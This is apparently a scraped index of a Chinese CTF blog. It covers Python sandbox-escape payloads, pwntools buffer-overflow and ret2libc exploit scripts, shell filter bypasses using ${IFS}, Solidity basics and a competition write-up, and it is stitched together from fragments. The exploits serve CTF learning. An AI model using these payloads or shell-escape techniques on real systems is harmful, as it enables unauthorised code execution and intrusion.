list(ascii_lowercase) dic = defaultdict(list) for char in lst: for i in range(0x110000): if normalize(\"NFKC\", chr(i)) == char: dic[char].append(chr(i)) if len(dic[char]) \u003e 9: break for key,value in dic.items(): print(key,value) a ['a', 'ª', 'ᵃ', 'ₐ', 'ⓐ', 'ａ', '𝐚', '𝑎', '𝒂', '𝒶'] b ['b', 'ᵇ', 'ⓑ', 'ｂ', '𝐛', '𝑏', '𝒃', '𝒷', '𝓫', '𝔟'] c ['c', 'ᶜ', 'ⅽ', 'ⓒ', 'ｃ', '𝐜', '𝑐', '𝒄', '𝒸', '𝓬'] d ['d', 'ᵈ', 'ⅆ', 'ⅾ', 'ⓓ', 'ｄ', '𝐝', '𝑑', '𝒅', '𝒹'] e ['e', 'ᵉ', 'ₑ', 'ℯ', 'ⅇ', 'ⓔ', 'ｅ', '𝐞', '𝑒', '𝒆'] f ['f', 'ᶠ', 'ⓕ', 'ｆ', '𝐟', '𝑓', '𝒇', '𝒻', '𝓯', '𝔣'] g ['g', 'ᵍ', 'ℊ', 'ⓖ', 'ｇ', '𝐠', '𝑔', '𝒈', '𝓰', '𝔤'] h ['h', 'ʰ', 'ₕ', 'ℎ', 'ⓗ', 'ｈ', '𝐡', '𝒉', '𝒽', '𝓱'] i ['i', 'ᵢ', 'ⁱ', 'ℹ', 'ⅈ', 'ⅰ', 'ⓘ', 'ｉ', '𝐢', '𝑖'] j ['j', 'ʲ', 'ⅉ', 'ⓙ', 'ⱼ', 'ｊ', '𝐣', '𝑗', '𝒋', '𝒿'] k ['k', 'ᵏ', 'ₖ', 'ⓚ', 'ｋ', '𝐤', '𝑘', '𝒌', '𝓀', '𝓴'] l ['l', 'ˡ', 'ₗ', 'ℓ', 'ⅼ', 'ⓛ', 'ｌ', '𝐥', '𝑙', '𝒍'] m ['m', 'ᵐ', 'ₘ', 'ⅿ', 'ⓜ', 'ｍ', '𝐦', '𝑚', '𝒎', '𝓂'] n ['n', 'ⁿ', 'ₙ', 'ⓝ', 'ｎ', '𝐧', '𝑛', '𝒏', '𝓃', '𝓷'] o ['o', 'º', 'ᵒ', 'ₒ', 'ℴ', 'ⓞ', 'ｏ', '𝐨', '𝑜', '𝒐'] p ['p', 'ᵖ', 'ₚ', 'ⓟ', 'ｐ', '𝐩', '𝑝', '𝒑', '𝓅', '𝓹'] q ['q', 'ⓠ', 'ｑ', '𝐪', '𝑞', '𝒒', '𝓆', '𝓺', '𝔮', '𝕢'] r ['r', 'ʳ', 'ᵣ', 'ⓡ', 'ｒ', '𝐫', '𝑟', '𝒓', '𝓇', '𝓻'] s ['s', 'ſ', 'ˢ', 'ₛ', 'ⓢ', 'ｓ', '𝐬', '𝑠', '𝒔', '𝓈'] t ['t', 'ᵗ', 'ₜ', 'ⓣ', 'ｔ', '𝐭', '𝑡', '𝒕', '𝓉', '𝓽'] u ['u', 'ᵘ', 'ᵤ', 'ⓤ', 'ｕ', '𝐮', '𝑢', '𝒖', '𝓊', '𝓾'] v ['v', 'ᵛ', 'ᵥ', 'ⅴ', 'ⓥ', 'ｖ', '𝐯', '𝑣', '𝒗', '𝓋'] w ['w', 'ʷ', 'ⓦ', 'ｗ', '𝐰', '𝑤', '𝒘', '𝓌', '𝔀', '𝔴'] x ['x', 'ˣ', 'ₓ', 'ⅹ', 'ⓧ', 'ｘ', '𝐱', '𝑥', '𝒙', '𝓍'] y ['y', 'ʸ', 'ⓨ', 'ｙ', '𝐲', '𝑦', '𝒚', '𝓎', '𝔂', '𝔶'] z ['z', 'ᶻ', 'ⓩ', 'ｚ', '𝐳', '𝑧', '𝒛', '𝓏', '𝔃', '𝔷'] 常见的绕过方法 __import__(\"os\").system('cat flag') open(\"flag\").read() open(chr(102)+chr(108)+chr(97)+chr(103)).read() #先输入eval(input())绕过字数限制 print(open(chr(102)+chr(108)+chr(97)+chr(103)).read()) #使用Unicode字符绕过过滤 ᵉval(inpᵘt()) #使用breakpoint()函数下断点进入Pdb，然后再输入命令 #输入help() #再输入sys #然后输入!cat flag获取flag #在help()中可以输入__main__或者__dict__查看是否有信息泄露 #使用bytes([]).decode()来绕过chr的decode open((bytes([102])+bytes([108])+bytes([97])+bytes([103])).decode()).read() #获取object的子类列表中倒数第四个子类的__init__方法的全局变量中名为'system'的对象 [].__class__.__mro__[-1].__subclasses__()[-4].__init__.__globals__[(bytes([115])+bytes([121])+bytes([115])+bytes([116])+bytes([101])+bytes([109])).decode()]((bytes([99])+bytes([97])+bytes([116])+bytes([32])+bytes([102])+bytes([108])+bytes([97])+bytes([103])).decode()) #如果过滤了bytes，可以用type(str(1).encode())绕过 [].__class__.__mro__[-1].__subclasses__()[-4].__init__.__globals__[(type(str(1).encode())([115])+type(str(1).encode())([121])+type(str(1).encode())([115])+type(str(1).encode())([116])+type(str(1).encode())([101])+type(str(1).encode())([109])).decode()]((type(str(1).encode())([108])+type(str(1).encode())([115])).decode()) #system('ls') 一些方法的type构造 str = type(str(0)) list = type(type(flag).mro())(flag) bytes = type(flag.encode()) bool = type(flag.istitle()) int = type(flag.find(flag)) tuple = type(flag.partition(flag)) #如果+被过滤，可以使用.__add__(xxx)来绕过 #自动生成Payload的脚本: command = \"cat flag_y0u_CaNt_FiNd_mE\" mylist = [] system = \"[].__class__.__mro__[-1].__subclasses__()[-4].__init__.__globals__[(type(str(1).encode())([115]).__add__(type(str(1).encode())([121])).__add__(type(str(1).encode())([115])).__add__(type(str(1).encode())([116])).__add__(type(str(1).encode())([101])).__add__(type(str(1).encode())([109]))).decode()]\" print(system,end='') for i in command: mylist.append(f\"type(str(1).encode())([{ord(i)}])\") print(\"(\"+mylist.pop(0),end='') # 删除并打印出列表的第一个元素 for item in mylist: print(f\".__add__({item})\",end='') print(\")\",end='') #type被过滤了可以使用list(dict(system=114514))[0]获取system这个字符串 [].__class__.__mro__[-1].__subclasses__()[-4].__init__.__globals__[list(dict(system=1))[0]](list(dict(sh=1))[0]) #可以使用dir()函数查看类中的方法和变量名 #如果有encode方法就可以读取flag \u003e my_flag.flag_level5.encode() #可以输入globals()函数查看全局变量中是否有信息泄露 ","date":"2023-08-22","objectID":"/posts/442fd1d/:0:0","tags":["Misc","CTF"],"title":"Misc-沙箱逃逸","uri":"/posts/442fd1d/"},{"categories":["CTF"],"content":"Record of Pwn-Learning. exp的板子 # -*- coding: UTF-8 -*- import sys from pwn import * context(log_level='debug', arch='i386', os='linux') #context(log_level='debug',arch='amd64', os='linux') pwnfile = './pwn200' if len(sys.argv) \u003c 2: io = process(pwnfile) else: io = remote('61.147.171.105', 50890) elf = ELF(pwnfile) rop = ROP(pwnfile) #以调试的模式运行程序 #gdb.attach(io) #pause() start_addr = 0x080483d0 func_addr = 0x08048484 padding = 0x70 delimiter = 'Welcome to XDCTF2015~!' write_plt = elf.symbols['write'] read_plt = elf.symbols['read'] def leak(address): payload = flat([b'a' * padding, write_plt, func_addr, 1, address, 4]) io.sendline(payload) # io.sendlineafter(delimiter,payload) data = io.recv(4) print(data) return data print(io.recv()) dyn = DynELF(leak, elf=ELF(pwnfile)) sys_addr = dyn.lookup(\"system\", 'libc') print(\"system address:\", hex(sys_addr)) payload1 = flat([b'a' * padding, start_addr]) # io.sendlineafter(delimiter,payload1) # #调用start函数恢复栈 io.sendline(payload1) io.recv() ppp_addr = 0x0804856c bss_addr = elf.bss() payload2 = flat([ b'a' * padding, read_plt, ppp_addr, 0, bss_addr, 8, sys_addr, func_addr, bss_addr ]) #payload = b'a' * padding + p32(return_addr) + p32(sh_addr) io.sendline(payload2) io.send('/bin/sh') io.interactive() DynELF模板 def leak(address): payload='A'*junk+p32(write_plt)+p32(func_addr)+p32(1)+p32(address)+p32(4) #junk是溢出需要的字节，利用pwndbg中的cyclic可以计算出 #write(1,address,4)表示将address向外写 r.send(payload) data = r.recv(4) print(data) return data dyn=DynELF(leak,elf=ELF('./pwn200'))#调用DynELF sys_addr = dyn.lookup('system',libc) print('system address:',hex(sys_addr)) plt地址和got地址的区别 GOT（Global Offset Table）全局偏移表。这是「链接器」为「外部符号」填充的实际偏移表。 PLT（Procedure Linkage Table）程序链接表。它有两个功能，要么在 .got.plt 节中拿到地址，并跳转。要么当 .got.plt没有所需地址的时，触发「链接器」去找到所需地址 前置知识 如何部署Pwn题： socat tcp-l:8877,fork exec:./question_2_x64,reuseaddr import socket import telnetlib import struct def P32(val): return struct.pack(\"\", val) def pwn(): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((\"127.0.0.1\", 8877)) payload = 'A'*0x8 + '\\x10' s.sendall(payload + '\\n') t = telnetlib.Telnet() t.sock = s t.interact() if __name__ == \"__main__\": # socat tcp-l:8888,fork exec:./question_1_plus_x64,reuseaddr pwn() pwntools各使用模块简介 https://www.cnblogs.com/liuyimin/p/7512252.html #基本模块 asm : 汇编与反汇编，支持x86/x64/arm/mips/powerpc等基本上所有的主流平台 dynelf : 用于远程符号泄漏，需要提供leak方法 elf : 对elf文件进行操作，可以获取elf文件中的PLT条目和GOT条目信息 gdb : 配合gdb进行调试，设置断点之后便能够在运行过程中直接调用GDB断下，类似于设置为即使调试JIT memleak : 用于内存泄漏 shellcraft : shellcode的生成器 #elf 模块 这是一个静态模块，即静态加载ELF文件，然后通过相关接口获取一些信息，常用接口有： got 获取指定函数的GOT条目 plt 获取指定函数的PLT条目 address 获取ELF的基址 symbols 获取函数的实际地址（待确定） 使用elf模块的例子 pwnfile = './2' elf = ELF(pwnfile) rop = ROP(pwnfile) main_addr = elf.symbols['main'] shell_addr = elf.symbols['shell'] puts_plt=elf.plt['puts'] puts_got=elf.got['puts'] 如何使用pwngdb进行动态调试 gcc question_3.c -o question_3 gcc question_3.c -no-pie -o question_3 gdb question_3 start 进入main函数： disassemble main 64位的程序用： disassemble $rip 32位的程序用： disassemble $eip 打断点： b *0x0000000000401293 查看断点 i b 查看寄存器的情况 i r 看rip到哪了 x/10i $rip 看输入的位置 x/20g $rbp-0x20 x/20b $rbp-0x20 查看func的地址（有符号表就可以打印） p \u0026func 步出 finish 看内存的基本情况 vmmap 编译指令 #关闭栈保护 gcc question_4_1.c -m32 -fno-stack-protector -o main #全部关闭 gcc -no-pie -fno-stack-protector -z execstack -m32 -o 3.exe 3.c #-no-pie：地址随机化 #-fno-stack-protector：没有堆栈保护 #-z execstack：堆栈可执行 编译保护 ASLR：栈地址随机化（必定打开） NX：栈保护 Canary（金丝雀）：防止缓冲区溢出 原理是在栈的ebp下面放一个随机数，在函数返回之前会检查这个数有没有被修改，就可以检测是否发生栈溢出了。 绕过Canary的方法： 1 泄露栈中的Canary 2 one-by-one 爆破 Canary 3 劫持__stack_chk_fail 函数 4 覆盖 TLS 中储存的 Canary 值 PIE：地址无关代码，随即bss、data、text 破解PIE保护的方法：虽然函数地址随机化了，但是各个函数之间的偏移量是不变的。 查看内存的具体情况 ps -a|grep questio cat /proc/10679/maps 如何更改本地glibc的版本 https://blog.csdn.net/weixin_44864859/article/details/107237134 patchelf --set-interpreter /home/kali/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/ld-2.27.so --set-rpath /home/kali/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/ 常用的一些工具 #objdump objdump -t filename 可以查看程序中使用到的函数，查看是否使用一些危险函数 objdump -t .te","date":"2023-08-07","objectID":"/posts/5e91e89/:0:0","tags":["CTF","Pwn"],"title":"CTF-Pwn学习记录","uri":"/posts/5e91e89/"},{"categories":["CTF"],"content":"Pwn题做得还是太少了，希望真的能做到每日一Pwn吧@_@ CTFHUB——ret2text from pwn import * host = 'challenge-6d9543332f6f24b5.sandbox.ctfhub.com' port = 33376 #io = process(\"./pwn\") io = connect(host, port) payload = 'A' * 0x78 + p64(0x4007b8) io.sendline(payload) io.interactive() [SWPUCTF 2021 新生赛]nc签到 blacklist = ['cat','ls',' ','cd','echo','\u003c','${IFS}'] #IFS表示 Internal Field Separator （内部字段分隔符） while True: command = input() for i in blacklist: if i in command: exit(0) os.system(command) 下载附件，得到一个py文本文件，发现过滤了好多命令 法1、nc上后直接su提权，然后cat flag 法2、使用引号截断：l’s’ c’at’IFS9flag 法3、使用tac绕过cat过滤（tac是从最后一行倒序显示内容，并将所有内容输出） from pwn import * p = remote(\"1.14.71.254\",28082) p.sendline(\"tac$IFS$9flag\") print(p.recv()) p.interactive() #Linux下绕过空格过滤的方法： #cat flag.txt cat${IFS}flag.txt #${IFS} 对应 内部字段分隔符 cat$IFS$9flag.txt #${9} 对应 空字符串 cat\u003cflag.txt cat\u003c\u003eflag.txt kg=$'\\x20flag.txt'\u0026\u0026cat$kg #${PS2} 对应字符 '\u003e' #${PS4} 对应字符 '+' #Windows下绕过空格过滤的方法： （实用性不是很广，也就type这个命令可以用） type.\\flag.txt type,flag.txt echo,123456 [SWPUCTF 2021 新生赛]gift_pwn 有system(\"/bin/sh\")的ret2text from pwn import * #context(log_level='debug',arch='i386', os='linux') context(log_level='debug', arch='amd64', os='linux') #pwnfile= './question_4_3_x86' #io = process(pwnfile) io = remote('1.14.71.254', 28707) # elf = ELF(pwnfile) # rop = ROP(pwnfile) padding = 0x18 #debug \"\"\" gdb.attach(io) pause() \"\"\" \"\"\"leak_func_name ='write' leak_func_got = elf.got[leak_func_name] return_addr = elf.symbols['dofunc']\"\"\" sh_addr = 0x4005B6 payload = b'a' * padding + p64(sh_addr) #payload = flat(['a'*padding, return_addr]) #payload = flat([cyclic(padding), return_addr,sh_addr]) # delimiter = '' # io.sendlineafter(delimiter, payload) io.sendline(payload) io.interactive() [CISCN 2019华北]PWN1 int func() { char v1[44]; // [rsp+0h] [rbp-30h] BYREF float v2; // [rsp+2Ch] [rbp-4h] v2 = 0.0; puts(\"Let's guess the number.\"); gets(v1); if ( v2 == 11.28125 ) return system(\"cat /flag\"); else return puts(\"Its value should be 11.28125\"); } 法1、 也就是说只要通过栈溢出把v2的值覆盖为11.28125就可以得到flag 因为这里是浮点数，要先转换为16进制（0x41348000），然而float类型的长度是四字节， 所以不能用p64,要用p32发送 from pwn import * #context(log_level='debug',arch='i386', os='linux') context(log_level='debug', arch='amd64', os='linux') #pwnfile= './question_4_3_x86' #io = process(pwnfile) io = remote('1.14.71.254', 28146) # elf = ELF(pwnfile) # rop = ROP(pwnfile) padding = 0x30 - 0x4 #debug \"\"\" gdb.attach(io) pause() \"\"\" \"\"\"leak_func_name ='write' leak_func_got = elf.got[leak_func_name] return_addr = elf.symbols['dofunc']\"\"\" sh_addr = 0x4005B6 v2 = 0x41348000 payload = b'a' * padding + p32(v2) #payload = flat(['a'*padding, return_addr]) #payload = flat([cyclic(padding), return_addr,sh_addr]) delimiter = \"Let's guess the number.\\n\" io.sendlineafter(delimiter, payload) # io.sendline(payload) io.interactive() ret2text-cyclic # -*- coding: UTF-8 -*- from pwn import * io = process('./ret2text') binsh_addr = 0x804863A payload = b'a' * 112 + p32(binsh_addr) delimiter = 'There is something amazing here, do you know anything?' io.sendafter(delimiter, payload) io.interactive() 攻防世界pwn-200 ret2libc_x86 开了栈不可执行保护 所以思路是把‘/bin/sh’写入bss段然后执行 通过write和read函数泄露libc的地址 ssize_t sub_8048484() { char buf[108]; // [esp+1Ch] [ebp-6Ch] BYREF setbuf(stdin, buf); return read(0, buf, 0x100u); } 法1、 python exp.py pwn # -*- coding: UTF-8 -*- import sys from pwn import * context(log_level='debug', arch='i386', os='linux') #context(log_level='debug',arch='amd64', os='linux') pwnfile = './pwn200' #通过sys.argv来确定打本地还是打远程 if len(sys.argv) \u003c 2: io = process(pwnfile) else: io = remote('61.147.171.105', 50890) elf = ELF(pwnfile) rop = ROP(pwnfile) #以调试的模式运行程序 \"\"\" gdb.attach(io) pause() \"\"\" start_addr = 0x080483d0 func_addr = 0x08048484 padding = 0x70 delimiter = 'Welcome to XDCTF2015~!' write_plt = elf.symbols['write']#自动获取write函数的地址 read_plt = elf.symbols['read'] def leak(address): #泄露地址的板子 payload = flat([b'a' * padding, write_plt, func_addr, 1, address, 4]) #write函数和read函数都有三个参数，第三个参数代表字节长度 io.sendline(payload) # io.sendlineafter(delimiter,payload) da","date":"2023-01-08","objectID":"/posts/d7eced5/:0:0","tags":["CTF"],"title":"CTF-Pwn刷题记录","uri":"/posts/d7eced5/"},{"categories":["CTF"],"content":"平常打CTF比赛的时候，时常会遇到区块链类的题目， 然后好像这几年这个方向也比较火，所以就想着学习一下。 前言 智能合约语言目前以Solidity为主，除此以外，还有Vyper、Mandala和Obsidian等在不同方向改善智能合约的语言 开发工具推荐使用REMIX：http://remix.ethereum.org/，可以在浏览器中快速部署测试智能合约，不需要在本地安装任何程序，也是以太坊官方推荐的智能合约开发IDE。 REMIX IDE中的前两个选项就不多说了 第三个第四个选项是部署和执行，在代码编译完成后，可以在这里部署合约，也可以和已部署的合约进行交互。 ENVIRONMENT：默认使用JS虚拟机本地模拟一条测试链，如果想要连接测试网，选择Injected Provider。 ACCOUNT：当前使用的账户，如果是默认的JS虚拟机会分配数个有大量测试币的测试账户，如果 环境是Injected Provider，可以在 MetaMask中切换账户。 GAS LIMIT：合约的gas上限。 VALUE：转入多少ETH。 CONTARCT：一个文件中可能包含多个合约，这里选择具体部署哪一个合约。 At Address：如果合约已经部署，可以在这里输入该合约 的地址进行交互。 获取以太币 可以从这个水龙头中获取以太币（每天可以获取0.2） https://goerlifaucet.com/ 网络切换 可以使用metamask进行网络的切换，切换到你要使用的测试网络 反编译合约 可以使用在线网站：https://ethervm.io/decompile 可以得到合约反编译出来的代码，以及合约中的函数或变量。 区块链浏览器 https://goerli.etherscan.io/ 区块链浏览器是专门用来查看链上的各种信息的工具，可以检索的信息包括但不限于：账户地址、合约 地址、交易Hash等。 通过查询账户地址可以看到当前余额，近期交易等信息。 Solidity学习记录 一、合约文件结构剖析： 1.1一个合约文件的结构如下 合约文件： 版本申明 import 合约： 状态变量 函数 结构类型 事件 函数修改器 代码注释 一个完整合约结构的例子 pragma solidity ^0.4.0 import \"\"; /*This is a Contract @auth:XXX */ contract Test{ } 1.2合约的引入import import \"filename.sol\" 1.3引入状态变量、函数、事件、函数修改器 pragma solidity ^0.4.0; import \"solidity_for_import.sol\";//引入另外一个合约 contract Test{ //引入状态变量 uint a; //引入函数 function setA(uint x) public { a=x; //调用setA时触发事件Set_A emit Set_A(x);//利用web3随时监听我们的事件 } //引入事件 event Set_A(uint a); //定义结构体 struct Position{ int lat; int lng; } address public ownerAddr; //定义***函数修改器*** modifier ownerAddr(){ require(msg.sender==ownerAddr); _; } function mine() public owner { a+=1; } } 二、Solidity语言类型 2.1常量 有理数常量和整型常量 字符常量 十六进制常量 地址常量 2.2地址类型 address:表示一个账户地址（20B） balance表示账户地址的余额 函数transfer表示地址转移的以太币 2.3bool真假值类型 // SPDX-License-Identifier: SimPL-2.0 pragma solidity ^0.8.7; contract BooleanTest{ bool a; // view函数修饰符修饰的条件(只读取状态,但不修改状态) // 本地运行,不消耗gas function getBool() public view returns(bool){ return a; } /* function getBool2() public view returns(bool){ return !a;//取反 } */ } 2.4整型特性与运算 // SPDX-License-Identifier: SimPL-2.0 pragma solidity ^0.8.7; contract Math{ uint numa=4; uint numb=2; // pure修饰符修饰的条件(不读取且不修改任何状态) // 本地运行,不消耗gas function add(uint a,uint b)public pure returns(uint){ return a+b; } function jian(uint a,uint b)public pure returns(uint){ return a-b; } function cheng(uint a,uint b)public pure returns(uint){ return a*b; } function chu(uint a,uint b)public pure returns(uint){ return a/b; } } 2.5底层位运算 \u0026 | ^ « 左移 右移类似 1.\u0026 操作数之间转换成二进制之后每位进行与运算操作（同1取1） 2.| 操作数之间转换成二进制之后每位进行或运算操作（有1取1） 3.~ 操作数转换成二进制之后每位进行取反操作（直接相反） 4.^ 操作数之间转换成二进制之后每位进行异或操作（不同取1） 5.\u003c\u003c操作数转换成二进制之后每位向左移动x位的操作 6.\u003e\u003e操作数转换成二进制之后每位向右移动x位的操作 // SPDX-License-Identifier: SimPL-2.0 pragma solidity ^0.8.7; contract Math{ uint a=4; uint b=2; function weiyu()view public returns(uint){ return a \u0026 b; } function weihuo()view public returns(uint){ return a|b; } function weifan()view public returns(uint){ return a^b; } function zuoyi()view public returns(uint){ return a\u003c\u003cb; } function youyi()view public returns(uint){ return a\u003e\u003eb; } } 2.6固定长度字节数组byte 一个byte=8个位（XXXX XXXX）X为0或1，二进制表示 byte数组为bytes1，bytes2，…，bytes32，以八个位递增，即是对位的封装 举例 bytes1=uint8 bytes2=unit16 … bytes32=unit256 使用byte数组的理由： 1.bytesX可以更好地显示16进制 举例：bytes1=0x6A，bytes1=（XXXX XXXX）正好四个表示一个16进制，以此类推 2.bytes数据声明时加入public可以自动生成调用长度的函数，见下 // SPDX-License-Identifier: SimPL-2.0 pragma solidity ^0.8.7; contract Math{ bytes1 public num1=0x12; bytes4 public num2=0x12121212; } 3.bytes内部自带length长度函数，而且长度固定，而且长度不可以被修改 // SPDX-License-Identifier: SimPL-2.0 pragma solidity ^0.8.7; contract Math{ bytes1 public num1=0x12; bytes4 public num2=0x12121212; function getlength1()public view returns(uint8){ return num1.length; } function getlength2()public view returns(uint8){ return num2.length; } } 数组 Solidity中的数组可以具有编译时固定大小，也可以是动态的。 uint[3] fixed; //array of fixed length 3 uint[] dynamic; //a dynamic array has no fixed size, it can keep growing 也可以创建一个结构数组 Tips：将数组声明为public将自动为其创建getter方法 Voter[] public voting; 三、数据存储 3.1String内存原理 // SPDX-License-Identifier: SimPL-2.0 pragma solidity ^0.8.7; contract DynamicByte{ string name=\"xxxx\"; function getLength","date":"2022-12-02","objectID":"/posts/3e9e231/:0:0","tags":["Misc","CTF"],"title":"Misc-区块链安全","uri":"/posts/3e9e231/"},{"categories":["Writeup"],"content":"菜鸟第一次打省赛，浅浅混了个省三QAQ。。 初赛 Misc 题目名称 好怪哦 下载下来得到一个数据逆置的压缩包，直接用逆置脚本 input = open('fuck.zip', 'rb') input_all = input.read() ss = input_all[::-1] output = open('flag.zip', 'wb') output.write(ss) input.close() output.close() 然后解压得到一个缺少png文件头的png文件，补上文件头：89 50 4e 47 打开得到一张CRC有问题的图片，直接上脚本爆破即可拿到flag import binascii import struct import sys file = input(\"图片的地址\") fr = open(file,'rb').read() data = bytearray(fr[0x0c:0x1d]) crc32key = eval('0x'+str(binascii.b2a_hex(fr[0x1d:0x21]))[2:-1]) #原来的代码: crc32key = eval(str(fr[29:33]).replace('\\\\x','').replace(\"b'\",'0x').replace(\"'\",'')) n = 4095 for w in range(n): width = bytearray(struct.pack('\u003ei', w)) for h in range(n): height = bytearray(struct.pack('\u003ei', h)) for x in range(4): data[x+4] = width[x] data[x+8] = height[x] crc32result = binascii.crc32(data) \u0026 0xffffffff if crc32result == crc32key: print(width,height) newpic = bytearray(fr) for x in range(4): newpic[x+16] = width[x] newpic[x+20] = height[x] fw = open(file+'.png','wb') fw.write(newpic) fw.close sys.exit() 题目名称 神奇的棋盘 下载解压得到一张棋盘图片和一段棋盘加密后的密码： 这段密码是古典密码中的Polybius密码，直接去除逗号拉入随波逐流解密 得到密文：agaxxdaggvggvdvadavxdgadvgdvaaddddfxafafdgdvxxdggdggdxddfddxvgxadgvdfxvvaaddxdxxaddvgggxgxxxxgxxggxgdvvvgggagaaaagaaggagdddagagggaggagagaaavaaaxgxgggxggxgxgxxxv 然后用zsteg跑那个board的图片，得到一串base32，解密得到位移key： JRQXG5CLMV4XWWLVONQXS6LEON6Q==== LastKey{Yusayyds} 然后用CaptfEncode解ADFGVX密码： 得到一串十六进制字符串 ，最后直接十六进制转字符串得到flag DASCTF{d859c41c530afc1c1ad94abd92f4baf8} 题目名称 segmentFlow 下载后得到一个压缩包，里面有一个流量文件和七个4字节的文本文件 使用Github上的CRC爆破脚本进行爆破每个文本文件的CRC值，得到解压密码 用tshark导出数据 tshark -r segmentFlow.pcapng -Y “http.request” -T fields -e http.file_data \u003e data1.txt f = open('data.txt','r') data=f.read() data=data.split('\u0026sa066b32bfb3e7=') #print(data.split('\u0026sa066b32bfb3e7=')) #以这个字符串为分隔符，后面八位就是我们要的数据 for i in range(1,len(data)): #从第一个到最后一个列表 print(data[i][:8],end='') #一个列表元素的前八位 打开压缩包即可得到flag Reverse 题目名称 ManyCheck 三层验证，前两层拉入ida看或者直接用计算器算出结果：77、55、49 第三层根据ida里的算法，直接写个for循环就出来了：1198089844 #include \u003cbits/stdc++.h\u003e using namespace std; ​ int main() { for (int v1 = 0; v1 \u003c= 1718896489; v1++) { int v2 = 16; int v3 = (v1 \u003e\u003e (32 - v2)) | (v1 \u003c\u003c v2); if (v3 == 1718896489) printf(\"%d\", v1); } return 0; } Web 题目名称 nisc_easyweb 扫出 /api/record/文件 里面有个发送get请求功能的php,利用hackbar发送get请求即可得到flag 题目名称 nisc_学校门户网站 不知道是不是非预期，直接注册然后登录即可得到flag 题目名称 吃豆人吃豆魂 进入web开发者工具，找到game的源码，在index.js中有对生命值和分数的定义，修改分数为10000000，再次请求页面，直接弹出flag 决赛 Misc 题目名称 checkin_gift 下载附件压缩包并解压，得到一张jpg图片，在010中打开 发现图片末尾有一段base64编码，解码即可得到flag：DASCTF{e0155eb8a30c9c3cb0e56708da87bcc5} 题目名称 m4a 下载附件压缩包并解压，可以得到一个m4a.m4a文件，用VLC打开发现是一个莫斯电码的音频文件 直接使用AU打开，然后手敲出莫斯电码并解码 -... .- ....- ...-- -... -.-. . ..-. -.-. ..--- ----- ....- 解码莫斯可以得到：BA43BCEFC204 用010打开m4a文件，根据zip的文件头发现文件末尾藏了一个逆序的zip压缩包 逆序一下文件，把压缩包提取出来，并使用之前得到的密码解压，可以得到atbash.txt，内容如下 (+w)v\u0026LdG_FhgKhdFfhgahJfKcgcKdc_eeIJ_gFN 最后对密文先解码rot47，再atbash解码即可得到flag：DASCTF{5e0f98a95f79829b7a484a54066cb08f} 题目名称 Unkn0wnData 解压附件压缩包，得到一张flag.png 使用zsteg扫一下上面这张图片 发现图片末尾藏了一段base64编码，然后LSB中也隐写了一个压缩包 解码上面那段base64可以得到一串emoji表情 Where1sKey? 🙃💵🌿🎤🚪🌏🐎🥋🚫😆✅🍍🎤🐘🌏ℹ⌨😍🎈✉🤣🛩🍌🚪🍴ℹ☺🚹❓🍴🔬🌪🍵👣🔄☃👌😎👌🔄👌🔪🍌👁🍍🍌🌏🎃🚰🍵🐍🎅✅🍍🦓😎😊🤣🏹🍍💧🔄🔄🤣👁🥋🚫☺🍴😁🚫😇🚰⏩😍🌿💵🦓😇🛩✖🕹🐎📂📂💧🗒🗒 尝试用zsteg提取出隐写的数据，并用010转换为压缩包并解压 解压后可以得到1.txt，内容如下： data: 0000100000000000 00000c0000000000 00000e0000000000 00002a0000000000 0000100000000000 0000040000000000 0000080000000000 00002a0000000000 0000160000000000 00000b0000000000 00000c0000000000 00001c0000000000 00002a0000000000 00002c0000000000 0200340000000000 00002a0000000000 0200090000000000 00000c0000000000 0000110000000000 0000070000000000 0200170000000000 00002a0000000000 0200170000000000 00000b0000000000 0000080000000000 0000120000000000 00002a0000000000 0200150000000000 0000080000000000 0000040000000000 00000f0000000000 00000a0000000000 00002a0000000000 02000e0000000000 0000080000000000 00001c0000000000 00000a0000000000 00002a0000000000 0000040000000000 0000110000000000 0000070000000000 00000f0000000000 00002a0000000000 0200100000000000 0000040000000000 00000e0000000000 0000080000000000 0000080000000000 00002a0000000000 02000c0000000000","date":"2022-09-18","objectID":"/posts/3f7db4e/:0:0","tags":["CTF","Writeup"],"title":"2022 浙江省大学生网络与信息安全竞赛 Writeup","uri":"/posts/3f7db4e/"},{"categories":null,"content":"🔥 Introduce ID：Lunatic (Sometimes use Citanul) CTF@Misc | 天枢Dubhe | 4th Captain of A1natas Team Current Research Interest：Mobile Internet Security | Cellular Network Security | … Hi there! I’m a master’s student in BUPT, College of Cyberspace Security, class of 2025(advised by Assoc. Prof. Junsong Fu). During my undergraduate studies, I played CTF competitions and was the 4th captain of the A1natas Team from Zhejiang Normal University, advised by Prof. Hao Peng and Dr. Ming Zhong, where I specialized in Misc challenges. I’m an enthusiast of Steganography and Forensics, and I’ve also competed with union teams like Mini-Venom(ChaMD5) and XMCVE-Polaris(星盟安全). But Nowadays, I hack purely out of my own curiosity and passion. 💬 Contact Me QQ：MTI5MDAxODcxNA== Email：goodlunatic0@gmail.com Github：https://github.com/goodlunatic bilibili：https://space.bilibili.com/431131926 🏆 Selected Awards National Second Prize, China Collegiate Cybersecurity Competition (CISCN), 2024 First Prize, CISCN Southeast China Regional Tournament 2024 Honorable Mention, Mathematical Contest in Modeling (MCM), USA, 2023 Top 10 Outstanding Students of the School of Computer Science and Technology, 2023, 2024 Zhejiang Provincial Government Scholarship, 2022, 2023, 2024 First-Class Scholarship for Outstanding Students, 2022, 2023, 2024 Research and Innovation Scholarship, 2024 . . . ✨️ Sponsors If you like my blog , you can buy me a cup of java ☕. Thank You. 😃 You can attach your nickname and website in the remarks and I will put them here. Sponsor Amount 洗衣液 520.00 x 💎 mkd1r 52.00 x 💎 金丝吗喽 52.00 x 💎 胖虎 38.80 x 💎 X 野 33.33 x 💎 秋雨渐冷 30.00 x 💎 Time_trace 30.00 x 💎 小转风 30.00 x 💎 元亨利贞 29.99 x 💎 x*n 20.00 x 💎 *沉 20.00 x 💎 M4rt3n 20.00 x 💎 yuyy 20.00 x 💎 Yskm 20.00 x 💎 李上网来 19.00 x 💎 1 18.88 x 💎 biu 16.16 x 💎 WALL·E 15.00 x 💎 一 11.11 x 💎 cming 10.00 x 💎 reverse 10.00 x 💎 一网无前 10.00 x 💎 哩哩哩 10.00 x 💎 *忘 9.99 x 💎 Alexander 9.99 x 💎 S*e 9.99 x 💎 Virtua1 9.99 x 💎 0raN9e 9.99 x 💎 呆呆兽 9.90 x 💎 好故事慢慢来 8.88 x 💎 *全 8.88 x 💎 